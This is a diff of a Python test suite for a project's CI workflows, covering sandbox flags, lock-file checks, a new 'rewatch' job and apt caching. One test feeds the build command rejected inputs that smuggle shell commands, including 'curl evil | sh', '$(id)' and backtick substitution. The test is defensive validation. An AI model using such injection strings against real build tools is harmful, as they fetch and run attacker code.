@@ -42,7 +42,7 @@ COMMAND = {      # each job is the install and one command
     ("fund.yml", "command"): f"knos command {EVENT}",
     ("prove.yml", "settle"): f"knos settle {EVENT}",
     ("prove.yml", "review"): f"knos review {EVENT}",
-    ("prove.yml", "judge"): 'knos proof judge --base base --pr pr --issue "$ISSUE" --changed changed.txt --sandbox require',
+    ("prove.yml", "judge"): 'knos proof judge --base base --pr pr --issue "$ISSUE" --changed changed.txt --sandbox hermetic',
     ("prove.yml", "attest"): f'knos settle --tests --pull "$PULL" --head "$HEAD" --issue "$ISSUE" {EVENT}',
     ("check.yml", "claims"): f"knos check {EVENT}",
 }
@@ -317,7 +317,7 @@ def test_the_job_that_runs_pull_request_code_can_only_read_and_hands_on_one_line
     # the token goes with that one fetch through git's environment: not on a command line, not into the clone
     assert "GIT_CONFIG_VALUE_$n=AUTHORIZATION: basic $basic" in script and "git config" not in script and "$GH_TOKEN@" not in script
     # the step that runs the pull request's code has no token, and runs it only in the sandbox
-    assert command["env"] == {"ISSUE": "${{ needs.review.outputs.tests }}"} and command["run"].endswith("--sandbox require")
+    assert command["env"] == {"ISSUE": "${{ needs.review.outputs.tests }}"} and command["run"].endswith("--sandbox hermetic")
     assert [s for s in _steps(judge) if "GH_TOKEN" in (s.get("env") or {})] == [fetch]
     assert _steps(judge).index(install) < _steps(judge).index(probe) < _steps(judge).index(command)      # checked before the code runs
     # It is the only job that has anything of a pull request on disk, with attest.yml's rerun job, which is the same judge
@@ -389,9 +389,9 @@ def test_the_judge_job_says_where_its_boundary_is_and_checks_the_sandbox_has_no_
     assert script.startswith("set -euo pipefail\n") and "${{" not in script
     assert f"setpriv --reuid={judge.SANDBOX_UID} --regid={judge.SANDBOX_UID} --clear-groups --" in script
     assert "sudo -n unshare -n -- sh -c 'ip link set lo up 2>/dev/null; exec \"$@\"' sh" in script and 'env -i "$python" -c "$probe"' in script
-    assert '"unshare", "-n"' in inspect.getsource(judge.Box.wrap) and "env\", \"-i\"" in inspect.getsource(judge.Box.wrap)
+    assert '"unshare"' in inspect.getsource(judge.Box.wrap) and '["--net"]' in inspect.getsource(judge.Box.wrap) and "env\", \"-i\"" in inspect.getsource(judge.Box.wrap)
     # and the judge refuses to run without it, whatever the probe said
-    assert COMMAND["prove.yml", "judge"].endswith("--sandbox require")
+    assert COMMAND["prove.yml", "judge"].endswith("--sandbox hermetic")
 
 
 def _stand_in(tmp_path: Path, python_says: str, unshare_works: bool = True) -> str:
@@ -1456,7 +1456,7 @@ def test_the_published_set_is_the_source_byte_for_byte_with_the_lock_written_in(
     (out / ".git" / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
     assert pub.main(["check", str(out), "--lock", str(lock)]) == 0
     prove = out / ".github" / "workflows" / "prove.yml"
-    prove.write_bytes(prove.read_bytes().replace(b"--sandbox require", b"--sandbox auto"))
+    prove.write_bytes(prove.read_bytes().replace(b"--sandbox hermetic", b"--sandbox auto"))
     (out / ".github" / "workflows" / "relay.yml").write_text("name: stray\n", encoding="utf-8")
     (out / "LICENSE").unlink()
     (out / "requirements" / "sign.txt").write_text(third_party, encoding="utf-8")          # the list without the wheel
@@ -1495,7 +1495,7 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
     good = lock.read_text(encoding="utf-8")
     last = good.splitlines()[-1]
     for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
-                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.20 --hash=sha256:" + "a" * 64 + "\n"):
+                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.21 --hash=sha256:" + "a" * 64 + "\n"):
         bad = tmp_path / "bad.txt"
         bad.write_text(wrong, encoding="utf-8")
         with pytest.raises(SystemExit, match="the lock is not"):
@@ -1532,7 +1532,7 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
             pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
-    for bad in ('knos"; curl evil | sh; "', "knos==0.3.20 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
+    for bad in ('knos"; curl evil | sh; "', "knos==0.3.21 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
         with pytest.raises(SystemExit):
             pub.main(["build", str(tmp_path / "bad"), "--source", bad])
     assert not (tmp_path / "bad").exists()
@@ -1763,6 +1763,29 @@ def test_two_watchdogs_cannot_start_two_chains_and_two_first_runs_do_not_end_eac
     assert go("", [_run(85, "relay after 80", "queued")], me=83)[0] == "go=false"       # a chain's run, older or newer, always holds
 
 
+
+def test_a_chain_run_whose_relay_did_not_succeed_runs_the_watchdog_itself_and_starts_its_own_successor(tmp_path):
+    """GitHub sends no `workflow_run` to watchdog.yml for a run the workflow's own token started, which is every run of
+    the chain (staging, 8 Oct 2026: run 37752653844 handed over and 37753311643 was cancelled; neither woke
+    watchdog.yml, while the run a person started before them did). So the chain run whose relay job failed, was
+    cancelled or timed out runs the watchdog as its last job, with no secret, one watchdog at a time, and a run it
+    starts takes over from it: the first step of that run lets it go on while this run is still ending."""
+    doc = _doc(WF / "worker.yml")
+    job = doc["jobs"]["rewatch"]
+    assert job["needs"] == "relay"
+    assert job["if"] == ("always() && github.event_name == 'workflow_dispatch' && "
+                         "(needs.relay.result == 'failure' || needs.relay.result == 'cancelled')")
+    assert job["permissions"] == {"contents": "read", "actions": "write"} and job["concurrency"] == {"group": "knos-relay-watchdog", "cancel-in-progress": False}
+    assert "secrets." not in json.dumps(job) and not any("cache" in str(s.get("uses", "")) for s in _steps(job))
+    assert _steps(job)[0]["with"] == {"persist-credentials": False}
+    assert _steps(job)[-1]["run"] == "python3 -I src/knos/proof/chain.py watch --successor" and set(_steps(job)[-1]["env"]) == {"GH_TOKEN"}
+    go = _chain_step(tmp_path, _steps(doc["jobs"]["relay"])[0]["run"])
+    # run 90 (still ending: its rewatch job runs) started 95 as its successor: 95 goes on; a second successor does not
+    assert go("90", [_run(90, "relay after 85")], me=95)[0] == "go=true"
+    assert go("90", [_run(90, "relay after 85"), _run(93, "relay after 90")], me=95)[0] == "go=false"
+    watchdog = (WF / "watchdog.yml").read_text(encoding="utf-8")
+    assert "workflow's own token" in watchdog and "job `rewatch`" in watchdog
+
 def _run(n: int, title: str, status: str = "in_progress") -> dict:
     return {"databaseId": n, "status": status, "displayTitle": title}
 
@@ -1832,12 +1855,12 @@ def test_the_worker_keeps_its_keys_apart_the_claim_sweep_holds_none_and_the_fauc
     permissions, with no `pull-requests` among them."""
     doc = _doc(WF / "worker.yml")
     jobs = doc["jobs"]
-    assert sorted(jobs) == ["claims", "event", "faucet", "relay", "watchdog"]
+    assert sorted(jobs) == ["claims", "event", "faucet", "relay", "rewatch", "watchdog"]
     assert doc["permissions"] == {"contents": "read", "actions": "write", "issues": "write"}        # as before 0.3.19
     assert "permissions" not in jobs["relay"] and "permissions" not in jobs["event"]               # the fee key's jobs: the workflow's, and no more
     holds = {name: sorted(set(re.findall(r"secrets\.(\w+)", json.dumps(job)))) for name, job in jobs.items()}
     assert holds == {"claims": [], "event": ["KNOS_RELAY_KEY", "KNOS_RELAY_KEYS", "KNOS_WORKER_KEY"], "faucet": ["KNOS_FAUCET_KEY", "KNOS_RELAY_KEY", "KNOS_WORKER_KEY"],
-                     "relay": ["KNOS_RELAY_KEY", "KNOS_RELAY_KEYS", "KNOS_WORKER_KEY"], "watchdog": []}
+                     "relay": ["KNOS_RELAY_KEY", "KNOS_RELAY_KEYS", "KNOS_WORKER_KEY"], "rewatch": [], "watchdog": []}
     # the sweep: the chain's runs only, one at a time, with the forge token and nothing else
     claims = jobs["claims"]
     assert claims["if"] == "github.event_name == 'workflow_dispatch'" and claims["concurrency"] == {"group": "knos-claims", "cancel-in-progress": False}
@@ -1989,3 +2012,21 @@ def test_check_refuses_a_published_job_that_runs_a_module_or_a_command_the_wheel
     assert pub.modules_run() == [".github/workflows/prove.yml runs `python -m knos.verdict_gates`, which is not a module of src/knos"]
     monkeypatch.setattr(pub, "sources", lambda: {**real, "attest.yml": real["attest.yml"].replace("knos.verdict_gate shape", "knos.verdict_gate bless")})
     assert pub.modules_run() == [".github/workflows/attest.yml runs `python -m knos.verdict_gate bless`, a command that module does not have"]
+
+
+def test_every_job_that_installs_chromiums_system_packages_keeps_what_apt_fetched():
+    """tests.yml's two browser jobs: `playwright install-deps` fetched 32.5 MB at 131 kB/s from the runner's mirror on
+    8 Oct 2026 and the web job went over its 5 minutes. apt is pointed at a folder of the job's, restored before the
+    install and kept after it, keyed by the runner's image; nothing else in it changes."""
+    doc = _doc(WF / "tests.yml")
+    for name in ("sdk", "site"):
+        steps = _steps(doc["jobs"][name])
+        installs = [i for i, s in enumerate(steps) if "playwright install" in str(s.get("run", ""))]
+        apt = next(i for i, s in enumerate(steps) if s.get("id") == "apt")
+        kept = next(i for i, s in enumerate(steps) if "apt-archives" in str(s.get("with", {}).get("path", "")))
+        assert apt < kept < min(installs), name
+        assert 'Dir::Cache::Archives \\"$RUNNER_TEMP/apt-archives\\";' in steps[apt]["run"] and "/etc/apt/apt.conf.d/" in steps[apt]["run"]
+        assert "image=$ImageOS-$ImageVersion" in steps[apt]["run"]
+        cache = steps[kept]
+        assert cache["uses"].startswith("actions/cache@") and cache["with"]["path"] == "${{ runner.temp }}/apt-archives/*.deb"
+        assert cache["with"]["key"] == "playwright-deps-${{ runner.arch }}-${{ steps.apt.outputs.image }}-1.56.0-chromium"
